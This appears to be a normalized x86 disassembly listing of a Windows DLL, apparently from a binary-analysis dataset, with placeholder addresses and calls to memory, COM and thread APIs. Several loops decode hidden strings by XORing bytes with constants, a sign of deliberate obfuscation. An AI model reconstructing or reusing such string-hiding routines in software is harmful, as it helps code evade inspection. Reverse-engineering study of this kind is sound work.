mov [ ebp + eax * 2 - 0x18 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] cx
lea esi [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x9c ]
call sub_10034100
lea edx [ ebp - 0x9c ]
push edx
lea edx [ ebp - 0xdc ]
lea esi [ ebp - 0xd4 ]
mov [ ebp - 0x4 ] ebx
call sub_10040e00
add esp 0x4
push eax
lea edx [ ebp - 0x18 ]
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x1
call sub_100519f0
add esp 0x4
mov esi 0x8
cmp [ ebp - 0xc0 ] esi
jb r-xdata
xor ecx ecx
mov [ ebp - 0xc0 ] 0x7
mov [ ebp - 0xc4 ] ebx
mov [ ebp - 0xd4 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x88 ] esi
jb r-xdata
mov eax [ ebp - 0xd4 ]
push eax
call sub_1000a86e
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x88 ] 0x7
mov [ ebp - 0x8c ] ebx
mov [ ebp - 0x9c ] ax
mov edx [ ebp - 0x9c ]
push edx
call sub_1000a86e
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa0
and edx 0xff
mov [ ebp + eax * 2 - 0x80 ] dx
inc eax
cmp eax 0x2c
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x28 ] ax
lea esp [ esp ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3d
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebp - 0xec ]
xor eax eax
push edx
lea edx [ ebp - 0x80 ]
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x1c ] ax
call sub_10054650
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0xffda
and ecx 0xff
mov [ ebp - 0xd8 ] cx
xor edx edx
mov [ ebp - 0xd6 ] dx
movsx ecx [ eax ]
xor ecx 0x69
and ecx 0xff
mov [ ebp - 0xe0 ] cx
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0xe8 ]
mov [ ebp - 0xde ] dx
push ecx
lea edx [ ebp - 0xd8 ]
lea ecx [ ebp - 0xb8 ]
call sub_10054650
mov ecx [ ebp - 0xb8 ]
add esp 0x10
cmp [ ebp - 0xa4 ] esi
jae r-xdata
mov edx [ ebp - 0xe4 ]
push edx
call sub_10069160
add esp 0x4
cmp [ ebp - 0xa4 ] 0x8
mov esi eax
jb r-xdata
lea ecx [ ebp - 0xb8 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xb8 ]
push eax
call sub_1000a86e
add esp 0x4
sub_1006f5a0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087b20
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10068c70
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
movsx dx [ eax ]
movzx eax dx
push eax
push 0x1
mov ecx esi
call sub_10004190
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1006f62f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
push edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov [ esi ] dx
call sub_10055e2a
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi ]
push ecx
call sub_1000a86e
add esp 0x4
sub_1006f671
push 0x4
mov eax sub_10085119
call sub_10026266
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_1000c927
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0xc ]
jmp r-xdata
test esi esi
jne r-xdata
mov eax [ edi + 0x8 ]
dec esi
lea eax [ eax + esi * 4 ]
cmp [ eax ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_1001b2d2
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
call sub_10003c9c
call sub_10008d33
retn
mov ecx [ eax ]
call sub_1000c580
test eax eax
je r-xdata
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx ]
sub_1006f6e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089dbd
mov eax [ fs : 0x0 ]
push eax
sub esp 0x128
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx edx
cmp [ ebx + 0xec ] 0x0
mov [ ebp - 0x128 ] eax
mov [ ebp - 0x12c ] ecx
jne r-xdata
push 0x4
lea esi [ ebp - 0x120 ]
mov edi ebx
call sub_1006ff30
xor eax eax
mov [ ebp - 0x4 ] eax
push 0x2
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x70 ] 0xf
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x84 ] al
call sub_1003e780
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
mov eax 0x42
jmp r-xdata
push esi
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0x84 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
jne r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
push esi
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov edx [ ebp - 0x128 ]
push edx
mov [ ebp - 0x130 ] eax
lea eax [ ebp - 0xbc ]
push r--data
push eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xbc ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x1c ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0xd8 ]
push r--data
push edx
mov [ ebp - 0x128 ] eax
call sub_10003080
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xd8 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx 0x2
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x38 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
push 0x227a9
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x12c ] eax
call sub_10051c40
add esp 0x4
push eax
lea edx [ ebp - 0xa0 ]
push r--data
push edx
mov [ ebp - 0x4 ] 0x4
call sub_100282d0
add esp 0xc
mov [ ebp - 0x4 ] 0x6
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
push r--data
call sub_100651be
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] 0x0
mov [ ebp - 0x110 ] 0x0
cmp ecx 0x3
ja r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1000a86e
add esp 0x4
lea eax [ esi + 0x54 ]
push eax
lea eax [ ebp - 0x120 ]
call sub_10003290
push eax
push ebx
lea edi [ ebp - 0xa0 ]
call sub_10017cc0
mov ecx [ ebp - 0x11c ]
mov esi [ ebp - 0x120 ]
sub ecx esi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
push r--data
call sub_100651be
lea eax [ esi + 0x54 ]
push eax
push ebx
lea eax [ ebp - 0x120 ]
call sub_100215e0
mov ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x124 ] eax
call sub_10015820
mov esi eax
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ ebp - 0x4c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x7
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
call sub_10069410
mov ecx eax
mov [ ebp - 0x4 ] 0x9
mov esi [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub esi edi
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
jne r-xdata
push r--data
call sub_100651be
push 0xffffffff
push 0x0
push ecx
mov ecx edi
call sub_10004e10
mov edi 0x10
cmp [ ebp - 0x1c ] edi
jb r-xdata
push r--data
call sub_100651be
mov esi 0xf
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x38 ] edi
jb r-xdata
mov ecx [ ebp - 0x30 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x54 ] edi
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x128 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xa
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xb
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xc
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x1
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x1c ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x12c ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0xd
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0xf
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x2
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x38 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x124 ]
push ecx
lea edx [ ebp - 0x68 ]
push edx
call sub_10015820
mov esi eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x30 ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x10
call sub_10003080
add esp 0xc
mov ecx esi
lea esi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x11
call sub_10069410
mov esi eax
mov [ ebp - 0x4 ] 0x12
mov ecx [ ebp - 0x11c ]
mov edi [ ebp - 0x120 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0x3
ja r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
push 0xffffffff
push 0x0
lea ecx [ edi + 0x54 ]
push esi
call sub_10004e10
mov esi 0x10
cmp [ ebp - 0x38 ] esi
jb r-xdata
push r--data
call sub_100651be
mov edi 0xf
mov [ ebp - 0x38 ] edi
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x4c ] 0x0
cmp [ ebp - 0x1c ] esi
jb r-xdata
mov ecx [ ebp - 0x4c ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x30 ] 0x0
cmp [ ebp - 0x54 ] esi
jb r-xdata
mov edx [ ebp - 0x30 ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0xf4 ]
push ecx
lea edi [ ebp - 0x120 ]
call sub_1001e5a0
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x4 ] 0x13
mov [ ebp - 0x124 ] esp
push 0xffffffff
xor esi esi
push esi
lea edx [ ebp - 0xf4 ]
mov edi 0xf
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] esi
push edx
mov [ ecx ] 0x0
call sub_10037cf0
push esi
push ebx
call sub_1005c6a0
mov ebx 0x10
mov [ ebp - 0x124 ] eax
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xe0 ] edi
mov [ ebp - 0xe4 ] esi
mov [ ebp - 0xf4 ] 0x0
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0xf4 ]
push eax
call sub_1000a86e
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] esi
mov [ ebp - 0xa0 ] 0x0
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0xa0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] esi
mov [ ebp - 0xd8 ] 0x0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
mov edx [ ebp - 0xd8 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xac ] esi
mov [ ebp - 0xbc ] 0x0
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x120 ]
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x84 ] 0x0
cmp eax esi
je r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax [ ebp - 0x124 ]
mov edx [ ebp - 0x124 ]
push edx
mov edx [ ebp - 0x11c ]
lea ecx [ ebp - 0x114 ]
push ecx
push edx
push eax
call sub_10072070
mov eax [ ebp - 0x120 ]
push eax
call sub_1000a86e
add esp 0x14
sub_1006ff30
push ebp
mov ebp esp
push 0xffffffff
push sub_10087511
mov eax [ fs : 0x0 ]
push eax
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x3c ] esi
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov eax 0x1
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] ebx
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] ebx
call sub_10026420
mov ecx [ edi + 0xf4 ]
sub ecx [ edi + 0xf0 ]
mov eax 0x92492493
imul ecx
mov eax [ ebp - 0x34 ]
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add ecx edx
xor edx edx
div ecx
mov ecx [ edi + 0xf0 ]
add esp 0x4
push 0xffffffff
push ebx
lea eax [ edx * 8 ]
sub eax edx
lea eax [ ecx + eax * 4 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_10037cf0
mov ebx [ esi + 0x4 ]
mov eax [ esi ]
lea edx [ ebp - 0x2c ]
push edx
push ebx
call sub_10051870
add esp 0x8
cmp eax ebx
jne r-xdata
xor ebx ebx
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_1005ef00
mov eax [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x30 ] eax
cmp eax [ ebp + 0x8 ]
jb r-xdata
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10070050
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_10070090
mov [ esi ] r--data
push ebx
xor ebx ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x34 ] 0xf
mov [ esi + 0x30 ] ebx
mov [ esi + 0x20 ] bl
mov [ esi + 0x384 ] ebx
mov [ esi + 0x39c ] 0x1
mov [ esi + 0x3a0 ] ebx
mov [ esi + 0x3a4 ] ebx
mov [ esi + 0x3a8 ] ebx
mov [ esi + 0x3b0 ] ebx
mov [ esi + 0x3b4 ] ebx
mov [ esi + 0x3b8 ] ebx
mov [ esi + 0x3c0 ] ebx
mov [ esi + 0x3c4 ] ebx
mov [ esi + 0x3c8 ] ebx
mov [ esi + 0x3d0 ] ebx
call [ GetCurrentThreadId@IAT ]
push rw-data
mov [ esi + 0x374 ] eax
mov [ esi + 0x37c ] 0x1
call [ InterlockedIncrement@IAT ]
mov [ esi + 0x378 ] eax
mov [ esi + 0x380 ] ebx
mov eax esi
pop ebx
retn
sub_1007012c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10021cea
add esp 0x1c
pop ebp
retn
sub_10070150
push ebp
mov ebp esp
push ebx
push edi
xor edi edi
mov ebx ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi ] r--data
mov [ esi + 0x14 ] eax
cmp ebx edi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
mov ebx [ lstrlenW@IAT ]
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax edi
je r-xdata
push ebx
mov ebx [ lstrlenW@IAT ]
call ebx
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
push edi
push ecx
push eax
mov [ esi + 0x4 ] eax
call sub_1007f580
add esp 0xc
xor edi edi
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] edi
pop edi
mov eax esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
cmp eax edi
je r-xdata
mov edx [ ebp + 0xc ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0xc ]
push edi
push ecx
push eax
mov [ esi + 0x8 ] eax
call sub_1007f580
add esp 0xc
xor edi edi
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] edi
cmp [ ebp + 0xc ] edi
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
call ebx
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
push edi
push ecx
push eax
mov [ esi + 0x10 ] eax
call sub_1007f580
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] edi
sub_10070270
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10054390
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_100702e0
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
xor ecx ecx
mov [ esi ] cx
pop esi
retn
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10070310
push ebp
mov ebp esp
sub esp 0xa8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
lea edi [ ebp - 0xa0 ]
lea edx [ ebp - 0xa4 ]
mov esi ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ebx
mov [ ebp - 0xa0 ] ebx
call sub_1003a120
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x53
mov [ ebp - 0x9c ] ebx
call sub_1002f620
lea ecx [ ebp - 0x9c ]
push ecx
push edx
call sub_1004e270
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x98 ]
lea eax [ ebx + 0x67 ]
call sub_1002f620
mov ebx 0x1
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xef
call sub_1002f620
mov edx [ ebp - 0xa4 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0xa0 ]
push eax
call esi
mov ecx [ ebp - 0x9c ]
push ecx
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax [ ebp - 0x9c ]
push eax
call sub_10002bd3
mov edx [ ebp - 0xa0 ]
mov ecx [ ebp - 0xa4 ]
add esp 0x4
push eax
call sub_100450f0
jmp r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
sub_10070419
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
push 0x16
pop eax
pop ebp
retn
sub_10070446
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100637b6
dec [ ebp + 0x18 ]
inc [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10070480
push ebp
mov ebp esp
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
lea edx [ esi + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
push r--data
push r--data
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov [ esi ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
jns r-xdata
pop ebp
retn 0x4
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_100704bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
